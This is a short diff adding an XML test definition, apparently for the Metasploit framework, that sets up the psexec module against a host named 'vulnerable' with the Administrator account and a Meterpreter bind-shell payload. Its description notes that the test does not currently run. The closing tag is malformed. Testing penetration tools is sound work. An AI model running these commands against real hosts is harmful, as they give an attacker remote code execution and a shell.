@@ -1,0 +1,26 @@
+<xml>
+<msf_test>
+	<name>
+		psexec
+	</name>
+	<description>
+		This test sets up psexec on a vulnerable host. (doesn't run currently - bug)
+	</description>
+	<commands>
+		use windows/smb/psexec
+		set WORKSPACE default
+		set RHOST vulnerable
+		set SMBUser Administrator
+		set SMBPass 
+		set payload windows/meterpreter/bind_tcp
+		exit
+	</commands>
+	<output>
+		<successes>
+		</successes>
+		<failures>
+		</failures>
+		<failure_exceptions>
+		</failure_exceptions>
+	</output>
+<msf_test>
